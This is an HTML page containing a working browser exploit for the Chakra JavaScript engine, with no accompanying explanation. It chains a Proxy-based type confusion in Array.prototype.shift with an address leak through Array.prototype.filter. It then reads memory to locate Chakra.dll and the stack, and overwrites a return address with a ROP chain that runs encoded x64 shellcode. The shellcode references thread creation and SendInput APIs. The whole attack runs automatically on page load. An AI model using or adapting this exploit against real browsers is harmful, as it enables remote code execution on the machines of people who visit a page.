<!DOCTYPE html>
<META http-equiv="Expires" content="-1"> 
<META http-equiv="Pragma" content="no-cache"> 
<META http-equiv="Cache-Control" content="No-Cache"> 
<script src='./long.min.js'></script>
<script>
var Long = dcodeIO.Long;

var x = (new Array(56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)).slice();
var dv = undefined;
var adv = undefined;

function print_log(str) {
	var o = document.getElementById("log");
	o.innerHTML += str + "<br>";
}

function TriggerFillFromPrototypesBug(lo, hi) {
	x[2] = lo;
	x[3] = hi;

	x[8] = 0x200;

	x[10] = (lo - 0x38)|0;
	x[11] = hi;

	x[14] = (lo - 0x58)|0;
	x[15] = hi;

	var a = new Array(0x11111111, 0, 0x22222222, 0, 0x33333333, 0, lo, hi, 0x55555555, 0);

	var handler = {
		getPrototypeOf: function(target, name) {
			return a;
		}
	};

	var p = new Proxy([], handler);
	var b = [{}, [], "abc"];

	b.__proto__ = p;
	b.length = 4;

	a.shift.call(b); //trigger
	dv = b[2]; //b[2] is type confusion.
}

function PutDataAndGetAddr(t) {
	var d = new Array(1,2,3);
	class dummy {
		constructor() {
			return d;
		}
	};

	class MyArray extends Array {
		static get [Symbol.species]() {
			return dummy;
		}
	}

	var a = new Array({}, t, "singi", 7,7,7,7,7,7,7);

	function test(i) {
		return true;
	}

	a.__proto__ = MyArray.prototype;

	var o = a.filter(test);
	var h = [];

	for(item in o) {
		var n = new Number(o[item]);
		if(n<0) {
			n = n + 0x100000000;
		}
		h.push(n);
	}

	return [h[2],h[3]];
}

function pwn() {	
	adv = new DataView(new ArrayBuffer(8), 0); //set normal DataView Object.
	var offset = 0x40;
	var chakraBaseOffset = 0x5938d8;
	var tctx_offset = 0x735ea8;
	var chakraBase = 0x0;
	var stackPointer = 0x0;
	var callFunction_offset = 0x13d873;

	var leakData = PutDataAndGetAddr(x);
	var longVar = new Long(leakData[0], leakData[1]);
	print_log("[+] fake array Address : 0x" + longVar.toString(16));

	TriggerFillFromPrototypesBug( (leakData[0]+offset+0x18) & 0xffffffff, leakData[1] & 0xffffffff);

	//get Chakra Base
	chakraBase = new Long(adv.getUint32.call(dv,0,true)-chakraBaseOffset,adv.getUint32.call(dv,4,true));
	print_log("[+] Chakra.dll Base : 0x" + chakraBase.toString(16));

	//get thread context using globalListLast.
	var tctx = new Long( chakraBase.getLowBitsUnsigned()+tctx_offset, chakraBase.getHighBitsUnsigned());
	print_log("[+] ThreadContext Address : 0x" + tctx.toString(16));

	x[14] = tctx.getLowBitsUnsigned() & 0xffffffff;
	x[15] = tctx.getHighBitsUnsigned() & 0xffffffff;
	stackPointer = new Long(adv.getUint32.call(dv,0,true), adv.getUint32.call(dv,4,true));

	x[14] = (stackPointer.getLowBitsUnsigned()+0x548) & 0xffffffff;
	x[15] = stackPointer.getHighBitsUnsigned() & 0xffffffff;
	stackPointer = new Long(adv.getUint32.call(dv,0,true), adv.getUint32.call(dv,4,true));
	print_log("[+] Stack Pointer : 0x" + stackPointer.toString(16));

	var callFunctionAddr = new Long( chakraBase.getLowBitsUnsigned()+callFunction_offset, chakraBase.getHighBitsUnsigned());
	print_log("[+] _CallFunction+0xXX : 0x" + callFunctionAddr.toString(16));	

	var sc = unescape("%u8148%u78ec%u0001%u4c00%u848d%u6824%u0001%u4800%u158d%u05e5%u0000%u8d48%ub50d%u0005%ue800%u041a%u0000%u8b4c%u248c%u0168%u0000%u8d4c%u2484%u0170%u0000%u8d48%ub315%u0005%u4800%u0d8d%u0592%u0000%uf7e8%u0003%u4800%u0d8d%u0586%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%uab15%u0005%uff00%u2494%u0170%u0000%u8948%u2484%u0108%u0000%u8d48%u5f0d%u0005%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u055b%u0000%u94ff%u7024%u0001%u4800%u8489%u1024%u0001%u4800%u0d8d%u0574%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%u6e15%u0005%uff00%u2494%u0170%u0000%u8948%u2484%u0118%u0000%u8d48%u4d0d%u0005%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u055a%u0000%u94ff%u7024%u0001%u4800%u8489%u2024%u0001%u4800%u0d8d%u0526%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%u4315%u0005%uff00%u2494%u0170%u0000%u8948%u2484%u0128%u0000%u8d48%uff0d%u0004%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u0529%u0000%u94ff%u7024%u0001%u4800%u8489%u3024%u0001%u4800%u0d8d%u04d8%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%u0d15%u0005%uff00%u2494%u0170%u0000%u8948%u2484%u0138%u0000%u8d48%ub10d%u0004%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u04f8%u0000%u94ff%u7024%u0001%u4800%u8489%u4024%u0001%u4800%u0d8d%u048a%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%udd15%u0004%uff00%u2494%u0170%u0000%u8948%u2484%u0148%u0000%u8d48%u630d%u0004%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u04c7%u0000%u94ff%u7024%u0001%u4800%u8489%u5024%u0001%u4800%u0d8d%u043c%u0000%u94ff%u6824%u0001%u4800%uc189%u8d48%ub115%u0004%uff00%u2494%u0170%u0000%u8948%u2484%u0158%u0000%u8d48%u150d%u0004%uff00%u2494%u0168%u0000%u8948%u48c1%u158d%u0494%u0000%u94ff%u7024%u0001%u4800%u8489%u6024%u0001%uff00%u2494%u0160%u0000%uc748%u2444%u0058%u0000%u4800%u44c7%u5024%u0000%u0000%uc748%u2444%u0048%u0000%u4800%u4489%u4024%uc748%u2444%ue038%u0001%u4800%u44c7%u3024%u0280%u0000%uc748%u2444%u0028%u0000%u4800%u44c7%u2024%u0000%u0000%ub941%u0000%u40cf%u8d4c%u4505%u0004%u4800%u158d%u0437%u0000%u00b9%u0002%uff00%u2494%u0120%u0000%u8948%u48c3%ud989%u94ff%u2824%u0001%uba00%u0001%u0000%u8948%uffd9%u2494%u0130%u0000%ub841%u4141%u4141%uc748%uf4c2%uffff%u48ff%ud989%u94ff%u3824%u0001%uba00%u0001%u0000%u8948%uffd9%u2494%u0118%u0000%u64b9%u0000%uff00%u2494%u0108%u0000%u94ff%u6024%u0001%uba00%u0001%u0000%u8948%uffc1%u2494%u0118%u0000%uc748%u2444%u0028%u0000%u4800%u44c7%u2024%u0000%u0000%u8949%u4ce1%u058d%u0050%u0000%u00ba%u0000%ub900%u0000%u0000%u94ff%u1024%u0001%u4100%u00b9%u0000%u4100%u00b8%u0000%uba00%u0000%u0000%u8d48%u244c%uff60%u2494%u0140%u0000%u8d48%u244c%uff60%u2494%u0148%u0000%u8d48%u244c%uff60%u2494%u0150%u0000%uc9eb%u8148%u78c4%u0001%uc300%u8348%u50ec%u5657%u8948%ub9cf%u01f4%u0000%u97ff%u0108%u0000%u44c7%u2024%u0001%u0000%uc766%u2444%u002a%uc700%u2444%u0030%u0000%u4800%u44c7%u3824%u0000%u0000%uc766%u2444%u1228%uc700%u2444%u002c%u0000%u4100%u28b8%u0000%u4800%u548d%u2024%u01b9%u0000%uff00%u5897%u0001%ube00%u0014%u0000%uc766%u2444%u1b28%uc700%u2444%u002c%u0000%u4100%u28b8%u0000%u4800%u548d%u2024%u01b9%u0000%uff00%u5897%u0001%u6600%u44c7%u2824%u001b%u44c7%u2c24%u0002%u0000%ub841%u0028%u0000%u8d48%u2454%ub920%u0001%u0000%u97ff%u0158%u0000%u64b9%u0000%uff00%u0897%u0001%u4800%uee83%u7501%u66a5%u44c7%u2824%u0012%u44c7%u2c24%u0002%u0000%ub841%u0028%u0000%u8d48%u2454%ub920%u0001%u0000%u97ff%u0158%u0000%u3148%u5ec0%u485f%uc483%uc330%u8148%u48ec%u0002%u4800%u9c89%u0824%u0001%u4800%uac89%u1024%u0001%u4800%ubc89%u1824%u0001%u4800%ub489%u2024%u0001%u4c00%ua489%u2824%u0001%u4c00%uac89%u3024%u0001%u4c00%ub489%u3824%u0001%u4c00%ubc89%u4024%u0001%u6500%u8b4c%u251c%u0060%u0000%u8b4d%u185b%u8d4d%u105b%u894d%u4ddf%u1b8b%u49fc%u7b8b%u4860%uce89%u84ac%u74c0%u8a26%u8027%u61fc%u037c%uec80%u3820%u75c4%u4808%uc7ff%uff48%uebc7%u4de5%u1b8b%u394d%u75fb%u48d6%uc031%ubae9%u0000%u4900%u5b8b%u4430%u638b%u493c%udc01%u8149%u88c4%u0000%u4500%u2c8b%u4d24%ued85%u0875%u3148%ue9c0%u0097%u0000%u8d4e%u2b1c%u8b45%u2474%u4d04%uee01%u8b41%u184b%u8b45%u2053%u0149%uffda%u4dc9%u248d%u418a%u3c8b%u4824%udf01%u8948%ua6d6%u0875%u068a%uc084%u0974%uf5eb%ue5e2%u3148%uebc0%u455e%u638b%u4924%udc01%u4166%u0c8b%u454c%u638b%u491c%udc01%u8b41%u8c04%u394c%u7ce8%u4c3f%uf039%u3a73%u8d48%u1834%u8d48%u24bc%u0148%u0000%u80a4%u2e3e%ufa75%uc7a4%u4407%u4c4c%u4d00%uc689%u8d48%u248c%u0148%u0000%uff41%u4dd1%uf089%u8d48%u248c%u0148%u0000%u8948%ue9f2%ufeff%uffff%u0148%u49d8%u0089%u8b48%u249c%u0108%u0000%u8b48%u24ac%u0110%u0000%u8b48%u24bc%u0118%u0000%u8b48%u24b4%u0120%u0000%u8b4c%u24a4%u0128%u0000%u8b4c%u24ac%u0130%u0000%u8b4c%u24b4%u0138%u0000%u8b4c%u24bc%u0140%u0000%u8148%u48c4%u0002%uc300%u454b%u4e52%u4c45%u3233%u442e%u4c4c%u4300%u6572%u7461%u5465%u7268%u6165%u0064%u6547%u5074%u6f72%u4163%u6464%u6572%u7373%u4c00%u616f%u4c64%u6269%u6172%u7972%u0041%u6c53%u6565%u0070%u5355%u5245%u3233%u442e%u4c4c%u5300%u6977%u6374%u5468%u546f%u6968%u5773%u6e69%u6f64%u0077%u7243%u6165%u6574%u6957%u646e%u776f%u7845%u0041%u7055%u6164%u6574%u6957%u646e%u776f%u5300%u6f68%u5777%u6e69%u6f64%u0077%u6553%u5774%u6e69%u6f64%u4c77%u6e6f%u5067%u7274%u0057%u6547%u4d74%u7365%u6173%u6567%u0057%u7254%u6e61%u6c73%u7461%u4d65%u7365%u6173%u6567%u4400%u7369%u6170%u6374%u4d68%u7365%u6173%u6567%u0057%u6553%u646e%u6e49%u7570%u0074%u6547%u4474%u7365%u746b%u706f%u6957%u646e%u776f%u7300%u6174%u6974%u0063%u6554%u7473%u4100");

	var leakData = PutDataAndGetAddr(sc);
	x[14] = (leakData[0]+0x20) & 0xffffffff;
	x[15] = leakData[1] & 0xffffffff;
	var scAddr = new Long( adv.getUint32.call(dv, 0, true) , adv.getUint32.call(dv, 4, true));
	print_log("[+] our shellcode address : 0x" + scAddr.toString(16));

	var dummy = new Long(0,0, true);
	var rop = [
		chakraBase.add(0x1DA2F5), //in Memory::HeapPageAllocator
		scAddr.and(new Long(0xfffff000, 0xffffffff, true)),
		new Long(0x1000, 0, true),
		new Long(0x40, 0, true),
		chakraBase.add(0x1DA2CB), //in Memory::HeapPageAllocator 
		dummy,dummy,dummy,dummy,dummy,dummy,
		new Long(0, 0, true),
		dummy,dummy,dummy,dummy,dummy,dummy,
		dummy,dummy,dummy,dummy,dummy,dummy,
		scAddr
	];

	x[8] = 0x1000;
	x[14] = (stackPointer.getLowBitsUnsigned()-0x320) & 0xffffffff;
	x[15] = stackPointer.getHighBitsUnsigned() & 0xffffffff;

	var match = callFunctionAddr.getLowBitsUnsigned();
	var count = 0;

	alert('we can go next step nicely!');

	for(i=0;i<0x1000;i+=8) {
		if(match == adv.getUint32.call(dv, i,true)) {
			print_log("matched! " + i.toString(16));
			if(count == 5) {
				for(k=0;k<rop.length;k++) {
					adv.setUint32.call(dv, i, rop[k].low, true);
					adv.setUint32.call(dv, i+4, rop[k].high, true);
					i+=8;
				}
				break;
			}
			count++;
		}
	}
}

window.onload = function() {
	pwn();
}

</script>

<body>
	<div id='log'></div>
</body>
</html>
